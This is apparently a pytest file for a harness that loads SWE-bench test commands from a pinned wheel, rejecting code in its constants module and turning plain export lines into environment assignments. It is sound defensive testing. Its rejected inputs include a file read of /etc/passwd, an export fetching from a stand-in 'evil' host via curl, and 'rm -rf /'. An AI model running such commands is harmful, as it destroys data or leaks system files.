"""SWE-bench's per-version test commands come from the pinned swebench wheel, read as plain data only: a constants
module with anything but data-building code is refused before it runs. The harness's test files are its test patch's
files minus its non-test extensions."""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

import pytest

from receipts.contracts import RunnerKind
from receipts.eval.hashing import sha256_bytes
from receipts.eval.specs import (
    CONSTANTS,
    LOG_PARSERS,
    SPECS_FILE,
    XFAIL_PARSERS,
    RepoSpec,
    SpecsError,
    changed_files,
    derive,
    dump,
    env_exports,
    evaluate_constants,
    expected_failure_passes,
    harness_test_files,
    load,
    run_phase_test_command,
)

CONSTANTS_PY = """
TEST_PYTEST = "pytest --no-header -rA --tb=no -p no:cacheprovider"
TEST_PYTEST = "pytest -rA"
TEST_DJANGO = "./tests/runtests.py --verbosity 2 --settings=test_sqlite --parallel 1"
SPECS_DJANGO = {k: {"python": "3.6", "install": "python -m pip install -e .", "test_cmd": TEST_DJANGO} for k in ["3.0"]}
SPECS_DJANGO.update({k: {"python": "3.8", "test_cmd": TEST_DJANGO} for k in ["3.1"]})
SPECS_SYMPY = {"1.1": {"test_cmd": ["bin/test --old", "bin/test -C --verbose"]}}
SPECS_SPHINX = {k: {"test_cmd": "tox --current-env -epy39 -v --", "pre_install": []} for k in ["3.5"]}
for k in ["3.5"]:
    SPECS_SPHINX[k]["pre_install"].extend(["sed -i x tox.ini"])
    if k == "3.5":
        SPECS_SPHINX[k]["python"] = "3.9"
MAP_REPO_VERSION_TO_SPECS_PY = {
    "django/django": SPECS_DJANGO,
    "sympy/sympy": SPECS_SYMPY,
    "sphinx-doc/sphinx": SPECS_SPHINX,
    "pytest-dev/pytest": {"5.4": {"test_cmd": TEST_PYTEST, "eval_commands": ["export X=1"]}},
}
"""


def wheel(tmp_path: Path, constants: str = CONSTANTS_PY) -> tuple[Path, str]:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr(CONSTANTS, constants)
        z.writestr("swebench-4.1.0.dist-info/METADATA", "Metadata-Version: 2.1\nName: swebench\nVersion: 4.1.0\n")
    path = tmp_path / "swebench-4.1.0-py3-none-any.whl"
    path.write_bytes(buf.getvalue())
    return path, sha256_bytes(buf.getvalue())


PAIRS = {("django/django", "3.0"), ("django/django", "3.1"), ("sympy/sympy", "1.1"), ("sphinx-doc/sphinx", "3.5"),
         ("pytest-dev/pytest", "5.4")}  # fmt: skip


def test_the_table_reads_each_versions_command_and_its_runner(tmp_path: Path) -> None:
    path, sha = wheel(tmp_path)
    table = derive(path, sha, PAIRS)
    assert table.swebench_version == "4.1.0" and table.wheel_sha256 == sha
    assert table.get("django/django", "3.0").test_cmd.startswith("./tests/runtests.py")
    assert table.get("django/django", "3.0").install == "python -m pip install -e ."
    assert table.get("django/django", "3.0").runner is RunnerKind.DJANGO
    assert table.get("sympy/sympy", "1.1").test_cmd == "bin/test -C --verbose"  # a list: the harness reads the last
    assert table.get("sympy/sympy", "1.1").runner is RunnerKind.SYMPY
    assert table.get("sphinx-doc/sphinx", "3.5").runner is RunnerKind.PYTEST
    assert table.get("pytest-dev/pytest", "5.4").test_cmd == "pytest -rA"  # the later binding wins, as in Python
    assert table.get("pytest-dev/pytest", "5.4").eval_commands == ("export X=1",)
    assert load(dump(table)) == table
    with pytest.raises(SpecsError, match="no SWE-bench spec"):
        table.get("django/django", "9.9")


def test_the_table_names_each_pool_instances_version_and_finds_its_own_spec(tmp_path: Path) -> None:
    """Round 6 (the round-5 review's V24): the table records the version each pool instance runs, so a committed
    target can be checked against its own version's spec, never another version's of the same repository; an
    instance the table does not name, or whose version has no spec here, is refused."""
    path, sha = wheel(tmp_path)
    instances = {"django__django-1": ("django/django", "3.0"), "django__django-2": ("django/django", "3.1")}
    table = derive(path, sha, PAIRS, instances=instances)
    assert table.format == "receipts.eval.test-specs/2"
    assert table.instances == {"django__django-1": "3.0", "django__django-2": "3.1"}
    assert table.for_instance("django__django-2", "django/django").version == "3.1"
    assert load(dump(table)) == table
    with pytest.raises(SpecsError, match="not in the table's pool"):
        table.for_instance("django__django-3", "django/django")
    with pytest.raises(SpecsError, match="not one of the table's repository versions"):
        derive(path, sha, PAIRS, instances={"django__django-9": ("django/django", "4.0")})


def test_plant_a_wheel_with_other_bytes_or_a_missing_version_is_refused(tmp_path: Path) -> None:
    path, _ = wheel(tmp_path)
    with pytest.raises(SpecsError, match="not the pinned swebench wheel"):
        derive(path, "0" * 64, PAIRS)
    path, sha = wheel(tmp_path)
    with pytest.raises(SpecsError, match=r"has no spec for django/django 9\.9"):
        derive(path, sha, {("django/django", "9.9")})


@pytest.mark.parametrize(
    "planted",
    [
        "import os\n",
        "X = open('/etc/passwd').read()\n",
        "X = ().__class__\n",
        "X = __import__('os')\n",
        "X = (lambda: 1)()\n",
        "X = [].pop()\n",
        "def f():\n    return 1\n",
        "with open('x') as f:\n    pass\n",
    ],
)
def test_plant_a_constants_module_that_is_not_plain_data_never_runs(planted: str, tmp_path: Path) -> None:
    marker = tmp_path / "ran"
    with pytest.raises(SpecsError):
        evaluate_constants(CONSTANTS_PY + planted + f"\nopen({str(marker)!r}, 'w')\n")
    with pytest.raises(SpecsError):
        evaluate_constants(planted)
    assert not marker.exists()


def test_the_harness_runs_the_test_patch_files_minus_non_test_extensions() -> None:
    patch = (
        "diff --git a/tests/app/tests.py b/tests/app/tests.py\n+x\n"
        "diff --git a/tests/app/fixtures/data.json b/tests/app/fixtures/data.json\n+{}\n"
        "diff --git a/tests/app/notes.csv b/tests/app/notes.csv\n+a,b\n"
        "diff --git a/tests/app/tests.py b/tests/app/tests.py\n+again\n"
        "diff --git a/sympy/core/tests/test_basic.py b/sympy/core/tests/test_basic.py\n+y\n"
    )
    assert harness_test_files(patch) == ["tests/app/tests.py", "sympy/core/tests/test_basic.py"]
    assert changed_files(patch)[:2] == ["tests/app/tests.py", "tests/app/fixtures/data.json"]


# ---------------------------------------------------------------- round 5: the eval script's exports, and XFAIL

ROOT = Path(__file__).resolve().parents[2]
DJANGO = "./tests/runtests.py --verbosity 2 --settings=test_sqlite --parallel 1"


def test_the_eval_scripts_exports_become_leading_assignments() -> None:
    """swebench 4.1.0's eval script runs a spec's eval_commands before the tests (test_spec/python.py, lines 431 to
    432). Every `export NAME=value` line carries over as a leading NAME=value word; for Django 3.0 to 3.2 the
    `sed ... && locale-gen` line, which needs root, does not; a spec with no export keeps its command as it is."""
    two = ("export LANG=en_US.UTF-8", "export LC_ALL=en_US.UTF-8", "export PYTHONIOENCODING=utf8",
           "export LANGUAGE=en_US:en")  # fmt: skip
    three = ("sed -i '/en_US.UTF-8/s/^# //g' /etc/locale.gen && locale-gen", "export LANG=en_US.UTF-8",
             "export LANGUAGE=en_US:en", "export LC_ALL=en_US.UTF-8")  # fmt: skip
    assert env_exports(two) == ("LANG=en_US.UTF-8", "LC_ALL=en_US.UTF-8", "PYTHONIOENCODING=utf8", "LANGUAGE=en_US:en")
    assert env_exports(three) == ("LANG=en_US.UTF-8", "LANGUAGE=en_US:en", "LC_ALL=en_US.UTF-8")
    spec = RepoSpec(repo="django/django", version="2.2", test_cmd=DJANGO, runner=RunnerKind.DJANGO, eval_commands=two)
    cmd = run_phase_test_command(spec)
    assert cmd == f"LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8 PYTHONIOENCODING=utf8 LANGUAGE=en_US:en {DJANGO}"
    assert run_phase_test_command(spec.model_copy(update={"eval_commands": ()})) == DJANGO
    assert env_exports(["export A=1 B=2", "export A=3"]) == ("A=3", "B=2")  # a later export sets the value


@pytest.mark.parametrize(
    "line",
    [
        "export X=$(curl http://evil)",  # a value a shell would expand
        "export X=`id`",
        "export X=$HOME",
        "export 'X=a b'",  # a value a shell would split
        "export X=1 && rm -rf /",  # a compound command
        "export X",  # no value
        "export -n X=1",  # an option
        "X=1",  # not an export
        "sed -i 's/a/b/' x && export X=1",
        "export X='unbalanced",
        "export 9X=1",  # not a name
    ],
)
def test_plant_a_line_that_is_not_a_plain_export_carries_nothing(line: str) -> None:
    assert env_exports([line]) == ()


def test_every_pinned_spec_that_exports_carries_its_exports_and_no_other_does() -> None:
    """The committed table: Django 1.11, 2.2, 3.0, 3.1 and 3.2 export the harness's locale (55 of the 251 pool
    instances); every other pinned spec keeps SWE-bench's command."""
    table = load((ROOT / "eval" / SPECS_FILE).read_text())
    exporting = {(s.repo, s.version) for s in table.specs if env_exports(s.eval_commands)}
    assert exporting == {("django/django", v) for v in ("1.11", "2.2", "3.0", "3.1", "3.2")}
    for s in table.specs:
        cmd = run_phase_test_command(s)
        assert cmd.endswith(s.test_cmd) and (cmd == s.test_cmd) is ((s.repo, s.version) not in exporting)
        if (s.repo, s.version) in exporting:
            assert {"LANG=en_US.UTF-8", "LC_ALL=en_US.UTF-8"} <= set(cmd.split()[:4])


@pytest.mark.parametrize(
    ("repo", "passes"),
    [
        ("astropy/astropy", True),
        ("matplotlib/matplotlib", True),
        ("pallets/flask", True),
        ("psf/requests", True),
        ("pydata/xarray", True),
        ("pylint-dev/pylint", True),
        ("pytest-dev/pytest", True),
        ("scikit-learn/scikit-learn", True),
        ("sphinx-doc/sphinx", True),
        ("django/django", False),
        ("mwaskom/seaborn", False),
        ("sympy/sympy", False),
        ("example/unknown", False),  # no parser: never kept on a guess
    ],
)
def test_an_expected_failure_passes_only_where_swebenchs_parser_reads_xfail(repo: str, passes: bool) -> None:
    """swebench 4.1.0 log_parsers/python.py: the pytest-style parsers keep `XFAIL <id>` lines, which grading.py's
    test_passed counts as passing; parse_log_django, parse_log_seaborn and parse_log_sympy never write XFAIL."""
    assert expected_failure_passes(repo) is passes


def test_the_parser_table_covers_every_pinned_repository() -> None:
    table = load((ROOT / "eval" / SPECS_FILE).read_text())
    assert {s.repo for s in table.specs} <= set(LOG_PARSERS)
    assert set(LOG_PARSERS.values()) >= XFAIL_PARSERS
    assert {r for r, p in LOG_PARSERS.items() if p not in XFAIL_PARSERS} == {
        "django/django",
        "mwaskom/seaborn",
        "sympy/sympy",
    }
